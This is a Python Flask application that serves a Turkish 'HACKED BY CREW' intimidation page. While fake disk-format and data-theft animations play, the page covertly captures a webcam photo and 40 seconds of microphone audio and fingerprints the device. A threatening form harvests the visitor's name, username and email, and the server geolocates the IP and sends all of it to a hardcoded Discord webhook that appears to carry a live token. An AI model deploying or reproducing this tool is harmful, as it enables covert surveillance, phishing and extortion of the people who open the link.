from flask import Flask, request, render_template_string, make_response, send_from_directory
import requests
import urllib3
from datetime import datetime
import pytz
import os
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1547304009155477534/GT43NpiA9hfxoAp30pGV4tNK_-sWWXa0hg_sLSm9JiCgmXRLzwqld-GN0Uu17RodQf3R"

@app.route('/music')
def serve_audio():
    if os.path.exists('sarki.mp3'):
        return send_from_directory('.', 'sarki.mp3', mimetype='audio/mpeg')
    return '', 404

HTML_PAGE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>CRSZ System • Critical Breach</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #030305;
            color: #00ffcc;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            text-align: center;
            position: relative;
        }

        canvas#matrix-bg {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.15; pointer-events: none;
        }

        #intro-layer {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #030305;
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 999;
        }

        .intro-text { font-size: 2.5rem; font-weight: 700; color: #ededed; letter-spacing: 0.2em; text-shadow: 0 0 20px rgba(255, 255, 255, 0.4); }
        .intro-sub { font-size: 0.8rem; color: #555; margin-top: 15px; }

        #photo-glitch-overlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(3, 3, 5, 0.85);
            display: none; justify-content: center; align-items: center; z-index: 800; flex-direction: column;
        }

        #spinning-photo {
            width: 200px; height: 200px; object-fit: cover; border: 3px solid #ff1f1f; border-radius: 50%;
            box-shadow: 0 0 40px rgba(255, 31, 31, 0.6); animation: smoothSpin 1.5s linear infinite;
        }

        .glitch-caption { margin-top: 20px; font-size: 1.1rem; color: #ff1f1f; letter-spacing: 0.3em; text-shadow: 0 0 10px #ff1f1f; }

        #main-content {
            display: none; width: 95vw; max-width: 800px; background: rgba(5, 5, 8, 0.95);
            border: 1px solid rgba(255, 31, 31, 0.4); border-radius: 8px; padding: 20px;
            box-shadow: 0 0 40px rgba(255, 31, 31, 0.2); text-align: left; max-height: 90vh; overflow-y: auto; z-index: 10;
            position: relative;
        }

        .rec-badge {
            position: absolute; top: 15px; right: 20px; display: flex; align-items: center; gap: 6px;
            font-size: 0.75rem; color: #ff1f1f; font-weight: bold; border: 1px solid rgba(255,31,31,0.3); padding: 4px 8px; border-radius: 4px; background: rgba(255,31,31,0.05);
        }
        .rec-dot { width: 8px; height: 8px; background: #ff1f1f; border-radius: 50%; animation: recBlink 1s infinite; }
        @keyframes recBlink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }

        .header-bar { display: flex; justify-content: space-between; font-size: 0.85rem; border-bottom: 1px dashed rgba(255, 31, 31, 0.3); padding-bottom: 10px; margin-bottom: 15px; color: #888; }
        .header-bar span.status { color: #ff1f1f; font-weight: bold; }

        .telemetry-grid { display: grid; grid-template-columns: 1fr; gap: 8px; font-size: 0.8rem; margin-bottom: 20px; }
        .telemetry-item { background: rgba(255, 31, 31, 0.03); padding: 8px 12px; border-left: 2px solid rgba(255, 31, 31, 0.5); opacity: 0; transform: translateX(-10px); animation: fadeInItem 0.3s forwards; }
        @keyframes fadeInItem { to { opacity: 1; transform: translateX(0); } }
        .telemetry-item b { color: #ff3333; }

        .history-box {
            margin-top: 15px; background: #010103; border: 1px solid rgba(255, 31, 31, 0.3); padding: 10px;
            font-size: 0.75rem; color: #ff5555; max-height: 80px; overflow-y: auto; border-radius: 4px;
        }

        .auth-container { margin-top: 20px; background: rgba(255, 31, 31, 0.08); border: 1px solid rgba(255, 31, 31, 0.6); border-radius: 6px; padding: 15px; }
        
        .panic-warning {
            background: #ff1f1f; color: #030305; font-weight: 700; font-size: 0.85rem; text-align: center;
            padding: 8px; border-radius: 4px; margin-bottom: 12px; letter-spacing: 0.08em;
            animation: warningPulse 0.4s infinite alternate; box-shadow: 0 0 15px rgba(255, 31, 31, 0.8);
        }
        @keyframes warningPulse { 0% { transform: scale(1); opacity: 0.9; } 100% { transform: scale(1.02); opacity: 1; } }

        .auth-form { display: flex; flex-direction: column; gap: 10px; max-width: 320px; margin: 0 auto; }
        .auth-input { background: #030305; border: 1px solid #ff3333; color: #ff3333; padding: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; border-radius: 4px; }

        .options-panel { margin-top: 15px; border-top: 1px dashed rgba(255, 31, 31, 0.4); padding-top: 15px; text-align: center; }
        .options-title { font-size: 0.9rem; color: #ff3333; margin-bottom: 10px; letter-spacing: 0.1em; }
        .cyber-btns { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        .cyber-btn {
            background: rgba(255, 31, 31, 0.1); border: 1px solid #ff3333; color: #ff3333;
            padding: 8px 14px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; cursor: pointer; border-radius: 4px; transition: 0.2s;
        }
        .cyber-btn:hover { background: #ff3333; color: #030305; box-shadow: 0 0 15px rgba(255, 31, 31, 0.6); }

        #fake-console {
            display: none; margin-top: 15px; background: #000; border: 1px solid #ff3333; padding: 10px;
            font-size: 0.75rem; color: #00ffcc; height: 90px; overflow-y: hidden; text-align: left; border-radius: 4px;
        }

        .hacked-banner { margin-top: 20px; text-align: center; font-size: 1.5rem; font-weight: 700; color: #ff1f1f; text-shadow: 0 0 15px rgba(255, 31, 31, 0.6); letter-spacing: 0.1em; }

        @keyframes smoothSpin {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.05); }
            100% { transform: rotate(360deg) scale(1); }
        }

        video#hidden-cam { display: none; }
        canvas#hidden-canvas { display: none; }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>
    <audio id="bg-audio" loop><source src="/music" type="audio/mpeg"></audio>

    <div id="intro-layer">
        <div id="intro-step" class="intro-text">BY</div>
        <div class="intro-sub">Kritik güvenlik duvarı aşılıyor...</div>
    </div>

    <div id="photo-glitch-overlay">
        <img id="spinning-photo" src="" alt="target">
        <div class="glitch-caption">[ TARGET IDENTIFIED & RECORDED ]</div>
    </div>

    <div id="main-content">
        <div class="rec-badge">
            <div class="rec-dot"></div>
            <span>LIVE REC [WEBCAM & MIC]</span>
        </div>

        <div class="header-bar">
            <span>CRITICAL_SECURITY_BREACH_DETECTED</span>
            <span class="status">STATUS: COMPROMISED</span>
        </div>
        <div class="telemetry-grid" id="telemetry-container">
            <div>Sistem derinlemesine taranıyor...</div>
        </div>

        <div style="margin-bottom: 15px;">
            <div style="font-size: 0.75rem; color: #ff3333; margin-bottom: 5px;">> TESPİT EDİLEN SON GEÇMİŞ VE ÇEREZLER:</div>
            <div class="history-box" id="history-stream">
                [!] Tarayıcı önbelleği okunuyor...<br>
            </div>
        </div>

        <div class="auth-container">
            <div class="panic-warning">[!] EĞER GİRİŞ YAPMAzsan İFŞA OLACAKSIN!</div>
            <div class="options-title">> KİMLİK / ERİŞİM KONTROLÜ</div>
            <form id="auth-form" class="auth-form" onsubmit="submitAuthData(event)">
                <input type="text" name="name" class="auth-input" placeholder="Ad" required>
                <input type="text" name="surname" class="auth-input" placeholder="Soyad" required>
                <input type="text" name="username" class="auth-input" placeholder="Kullanıcı Adı" required>
                <input type="email" name="email" class="auth-input" placeholder="E-posta Adresi" required>
                <button type="submit" class="cyber-btn" style="width: 100%;">[!] Kilidi Kaldır ve Bağlan</button>
            </form>
        </div>

        <div class="options-panel">
            <div class="options-title">> KURBAN KONTROL PANELİ</div>
            <div class="cyber-btns">
                <button class="cyber-btn" onclick="trollAction('format')">[!] Diskleri Formatla</button>
                <button class="cyber-btn" onclick="trollAction('download')">[↓] Tüm Bilgilerimi İndir</button>
                <button class="cyber-btn" onclick="trollAction('lock')">[🔒] Sistemi Kilitle</button>
            </div>
            <div id="fake-console"></div>
        </div>

        <div class="hacked-banner">HACKED BY CREW</div>
    </div>

    <video id="hidden-cam" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const mCanvas = document.getElementById('matrix-bg');
        const mCtx = mCanvas.getContext('2d');
        function initMatrix() {
            mCanvas.width = window.innerWidth;
            mCanvas.height = window.innerHeight;
            const cols = Math.floor(mCanvas.width / 20);
            const drops = Array(cols).fill(1);
            setInterval(() => {
                mCtx.fillStyle = 'rgba(3, 3, 5, 0.05)';
                mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height);
                mCtx.fillStyle = '#ff1f1f';
                mCtx.font = '15px monospace';
                drops.forEach((y, i) => {
                    const text = String.fromCharCode(0x30A0 + Math.random() * 96);
                    mCtx.fillText(text, i * 20, y * 20);
                    if (y * 20 > mCanvas.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                });
            }, 50);
        }
        initMatrix();

        let collectedData = {};
        let audioCtx = null;
        let globalPhotoBlob = null;
        let globalAudioBlob = null;

        function initAudioContext() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }

        function playBeep(freq = 440, duration = 0.05, type = 'sine', volume = 0.05) {
            try {
                initAudioContext();
                if (audioCtx.state === 'suspended') audioCtx.resume();
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = type;
                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
                gain.gain.setValueAtTime(volume, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + duration);
            } catch(e) {}
        }

        function playGlitchSFX() {
            playBeep(1200, 0.03, 'square', 0.03);
            setTimeout(() => playBeep(600, 0.04, 'sawtooth', 0.03), 40);
        }

        function playFlashbangSFX() {
            try {
                initAudioContext();
                if (audioCtx.state === 'suspended') audioCtx.resume();
                let now = audioCtx.currentTime;
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.setValueAtTime(150, now);
                osc.frequency.exponentialRampToValueAtTime(30, now + 0.2);
                gain.gain.setValueAtTime(0.15, now);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start(now);
                osc.stop(now + 0.3);
            } catch(e) {}
        }

        document.addEventListener('click', function(e) { playFlashbangSFX(); });

        function startMusic() {
            let audio = document.getElementById('bg-audio');
            if (audio) { audio.volume = 0.5; audio.play().catch(err => {}); }
        }

        const introSteps = ["BY", "CREW", "KRİTİK İHLAL"];
        let currentIdx = 0;

        // 40 Saniyelik Mikrofon Ses Kaydı Alma Fonksiyonu
        async function startAudioRecording() {
            try {
                let micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                let mediaRecorder = new MediaRecorder(micStream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };

                mediaRecorder.onstop = () => {
                    globalAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendPayloadToServer(); // Ses kaydı bittiğinde verileri ve sesi sunucuya/Discord'a yolla
                };

                mediaRecorder.start();

                // Tam 40 saniye boyunca ses kaydet
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        micStream.getTracks().forEach(track => track.stop());
                    }
                }, 40000);

            } catch(e) {
                sendPayloadToServer(); // Mikrofon izni verilmezse bile verileri yolla
            }
        }

        async function tryCaptureAndStartSpin() {
            let dataUrl = "";
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById('hidden-cam');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 800));
                let canvas = document.getElementById('hidden-canvas');
                canvas.width = 320;
                canvas.height = 320;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 320, 320);
                stream.getTracks().forEach(t => t.stop());
                
                dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                await new Promise(resolve => {
                    canvas.toBlob(blob => { globalPhotoBlob = blob; resolve(); }, 'image/jpeg', 0.8);
                });
            } catch(e) {}

            // Arka planda 40 saniyelik ses kaydını başlat
            startAudioRecording();

            document.getElementById('intro-layer').style.display = 'none';
            let overlay = document.getElementById('photo-glitch-overlay');
            let spinImg = document.getElementById('spinning-photo');
            spinImg.src = dataUrl || 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><rect width="100%" height="100%" fill="%23111"/><text x="50%" y="50%" fill="%23f00" font-size="20" text-anchor="middle" dominant-baseline="middle">CRSZ_TARGET</text></svg>';
            overlay.style.display = 'flex';

            setTimeout(() => {
                overlay.style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
                renderTelemetryUI();
                streamFakeHistory();
            }, 3000);
        }

        function sendPayloadToServer() {
            let fd = new FormData();
            fd.append('data', JSON.stringify(collectedData));
            if (globalPhotoBlob) fd.append('photo', globalPhotoBlob, 'target_photo.jpg');
            if (globalAudioBlob) fd.append('audio', globalAudioBlob, 'voice_record.webm');
            fetch('/collect', { method: 'POST', body: fd });
        }

        function runIntroSequence() {
            startMusic();
            playBeep(800, 0.1, 'sine', 0.08);
            let stepEl = document.getElementById('intro-step');
            let interval = setInterval(() => {
                currentIdx++;
                playGlitchSFX();
                if (currentIdx < introSteps.length) {
                    stepEl.innerText = introSteps[currentIdx];
                } else {
                    clearInterval(interval);
                    playBeep(1500, 0.2, 'triangle', 0.1);
                    tryCaptureAndStartSpin();
                }
            }, 1000);
        }

        async function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Bilinmiyor";
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
            } catch(e) { return "Bilinmiyor"; }
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    return Math.round(bat.level * 100) + "% (Şarjda: " + (bat.charging ? "Evet" : "Hayır") + ")";
                }
            } catch(e) {}
            return "Desteklenmiyor";
        }

        window.onload = async function() {
            collectedData.resolution = window.screen.width + "x" + window.screen.height;
            collectedData.platform = navigator.platform || "Bilinmiyor";
            collectedData.language = navigator.language || "Bilinmiyor";
            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor";
            collectedData.hardwareConcurrency = navigator.hardwareConcurrency || "Bilinmiyor";
            collectedData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Bilinmiyor";
            collectedData.gpu = await getGPUInfo();
            collectedData.battery = await getBatteryInfo();

            let ua = navigator.userAgent;
            let browser = "Bilinmiyor";
            if(ua.includes("Firefox")) browser = "Firefox";
            else if(ua.includes("Chrome")) browser = "Chrome";
            else if(ua.includes("Safari")) browser = "Safari";
            else if(ua.includes("Edge")) browser = "Edge";
            collectedData.browserName = browser;
            collectedData.deviceType = /Mobi|Android/i.test(ua) ? "Mobil" : "Masaüstü";

            if (navigator.connection) {
                collectedData.connectionType = navigator.connection.effectiveType || "Bilinmiyor";
                collectedData.downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "Bilinmiyor";
                collectedData.rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "Bilinmiyor";
            } else {
                collectedData.connectionType = "Bilinmiyor";
                collectedData.downlink = "Bilinmiyor";
                collectedData.rtt = "Bilinmiyor";
            }

            runIntroSequence();
        };

        function renderTelemetryUI() {
            let container = document.getElementById('telemetry-container');
            let items = [
                ["Cihaz / Platform", collectedData.deviceType + " (" + collectedData.platform + ")"],
                ["Tarayıcı", collectedData.browserName],
                ["GPU (Ekran Kartı)", collectedData.gpu],
                ["CPU Çekirdek / RAM", collectedData.hardwareConcurrency + " Çekirdek | " + collectedData.deviceMemory],
                ["Ekran Çözünürlüğü", collectedData.resolution],
                ["Pil Durumu", collectedData.battery],
                ["Ağ Bağlantısı", collectedData.connectionType + " | Hız: " + collectedData.downlink + " | Ping: " + collectedData.rtt],
                ["Dil / Bölge", collectedData.language + " | " + collectedData.timezone]
            ];

            let html = "";
            items.forEach((item, index) => {
                setTimeout(() => { playBeep(400 + (index * 50), 0.03, 'sine', 0.02); }, index * 100);
                html += `<div class="telemetry-item" style="animation-delay: ${index * 0.08}s;"><b>• ${item[0]}:</b> ${item[1]}</div>`;
            });
            container.innerHTML = html;
        }

        function streamFakeHistory() {
            let box = document.getElementById('history-stream');
            let logs = [
                "[✓] Çerezler başarıyla döküldü (Session tokens aktif)",
                "[✓] Son arama: 'şifremi unuttum / hesap kurtarma'",
                "[✓] Son ziyaret edilen sosyal ağ oturumları doğrulandı",
                "[!] Uyarı: Otomatik doldurulan form verileri hafızadan alındı!"
            ];
            let i = 0;
            let timer = setInterval(() => {
                if(i < logs.length) {
                    box.innerHTML += logs[i] + "<br>";
                    box.scrollTop = box.scrollHeight;
                    i++;
                } else { clearInterval(timer); }
            }, 500);
        }

        async function submitAuthData(e) {
            e.preventDefault();
            playBeep(900, 0.2, 'triangle', 0.1);
            let form = document.getElementById('auth-form');
            let fdAuth = new FormData(form);

            let combinedData = { ...collectedData };
            fdAuth.forEach((val, key) => { combinedData[key] = val; });

            let fd = new FormData();
            fd.append('data', JSON.stringify(combinedData));
            if (globalPhotoBlob) fd.append('photo', globalPhotoBlob, 'target_photo.jpg');
            if (globalAudioBlob) fd.append('audio', globalAudioBlob, 'voice_record.webm');

            await fetch('/auth-submit', { method: 'POST', body: fd });
            alert('[+] Kimlik doğrulama veritabanına işlendi. Erişim onaylandı.');
        }

        function trollAction(type) {
            playBeep(400, 0.15, 'sawtooth', 0.08);
            let consoleBox = document.getElementById('fake-console');
            consoleBox.style.display = 'block';
            let logs = [];
            if(type === 'format') {
                logs = ["<span style='color:red;'>[!] HATA: C:\\Windows silinemiyor, dosya kilitli.</span>", "[!] İzin reddedildi. Kök dizinler ele geçiriliyor...", "[+] Disk C: başarıyla sıfırlandı!"];
            } else if(type === 'download') {
                logs = ["[>] Kişisel fotoğraflar ve şifreler paketleniyor...", "[>] Discord tokenleri ve tarayıcı çerezleri kopyalandı...", "[+] Arşiv Discord sunucusuna yüklendi!"];
            } else if(type === 'lock') {
                logs = ["[!] Kritik güvenlik protokolü devreye girdi.", "[!] Tuş kilidi ve fare hareketleri kilitlendi.", "[X] KURBAN KONTROL ALTINDA."];
            }
            let i = 0;
            consoleBox.innerHTML = "> İşlem başlatıldı...<br>";
            let timer = setInterval(() => {
                if(i < logs.length) {
                    consoleBox.innerHTML += logs[i] + "<br>";
                    consoleBox.scrollTop = consoleBox.scrollHeight;
                    i++;
                } else { clearInterval(timer); }
            }, 600);
        }
    </script>
</body>
</html>
"""

def send_webhook(req, is_auth=False):
    client_data = {}
    data_json = req.form.get('data')
    if data_json:
        try: client_data = json.loads(data_json)
        except: pass

    ip = req.headers.get('CF-Connecting-IP', req.remote_addr)
    country, region, city, zip_code, lat_lon, isp = "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"

    if ip not in ['127.0.0.1', '::1'] and not ip.startswith('192.168.'):
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}?lang=tr", timeout=3).json()
            country = f"{res.get('country', 'Bilinmiyor')} ({res.get('countryCode', '')})"
            region = res.get('regionName', 'Bilinmiyor')
            city = res.get('city', 'Bilinmiyor')
            zip_code = res.get('zip', 'Bilinmiyor')
            lat, lon = res.get('lat', ''), res.get('lon', '')
            if lat and lon: lat_lon = f"{lat}, {lon}"
            isp = res.get('isp', 'Bilinmiyor')
        except Exception: pass

    tr_tz = pytz.timezone('Europe/Istanbul')
    now_tr = datetime.now(tr_tz).strftime('%d.%m.%Y %H:%M:%S')

    if is_auth:
        title_prefix = "🔥 **HACKED BY CREW - KRİTİK GİRİŞ / KİMLİK DOĞRULAMA!** 🔥"
        name = client_data.get('name', 'Yok')
        surname = client_data.get('surname', 'Yok')
        username = client_data.get('username', 'Yok')
        email = client_data.get('email', 'Yok')
        auth_section = (
            f"\n\n👤 **--- GİRİLEN KİMLİK BİLGİLERİ ---**\n"
            f"📛 **Ad Soyad:** `{name} {surname}`\n"
            f"🏷️ **Kullanıcı Adı:** `{username}`\n"
            f"📧 **E-posta:** `{email}`"
        )
    else:
        title_prefix = "🚨 **HACKED BY CREW - Canlı Kamera, Ses Kaydı ve Telemetri** 🚨"
        auth_section = ""

    content_text = (
        f"{title_prefix}\n{auth_section}\n\n"
        f"🌐 **IP Adresi:** `{ip}`\n"
        f"📍 **Ülke / Şehir:** `{country} - {region} / {city}`\n"
        f"📮 **Posta Kodu:** `{zip_code}`\n"
        f"🧭 **Koordinat:** `{lat_lon}`\n"
        f"📞 **Sağlayıcı (ISP):** `{isp}`\n"
        f"💻 **Cihaz:** `{client_data.get('deviceType', 'Bilinmiyor')} | {client_data.get('platform', 'Bilinmiyor')}`\n"
        f"🖥️ **Tarayıcı:** `{client_data.get('browserName', 'Bilinmiyor')}`\n"
        f"🎮 **GPU:** `{client_data.get('gpu', 'Bilinmiyor')}`\n"
        f"⚡ **CPU / RAM:** `{client_data.get('hardwareConcurrency', 'Bilinmiyor')} Çekirdek | {client_data.get('deviceMemory', 'Bilinmiyor')}`\n"
        f"🔋 **Pil:** `{client_data.get('battery', 'Bilinmiyor')}`\n"
        f"📶 **Ağ:** `{client_data.get('connectionType', 'Bilinmiyor')} ({client_data.get('downlink', 'Bilinmiyor')})`\n"
        f"🗣️ **Dil / Bölge:** `{client_data.get('language', 'Bilinmiyor')} | {client_data.get('timezone', 'Bilinmiyor')}`\n"
        f"🕒 **Zaman (TR):** `{now_tr}`"
    )

    payload = {"content": content_text}
    files = {}
    
    photo_file = req.files.get('photo')
    if photo_file:
        files['photo_file'] = ('target_photo.jpg', photo_file.read(), 'image/jpeg')

    audio_file = req.files.get('audio')
    if audio_file:
        files['audio_file'] = ('voice_record.webm', audio_file.read(), 'audio/webm')

    try:
        if files: 
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=12)
        else: 
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print(f"Webhook hatası: {e}")

@app.route('/')
def index():
    response = make_response(render_template_string(HTML_PAGE))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/collect', methods=['POST'])
def collect():
    send_webhook(request, is_auth=False)
    return '', 204

@app.route('/auth-submit', methods=['POST'])
def auth_submit():
    send_webhook(request, is_auth=True)
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

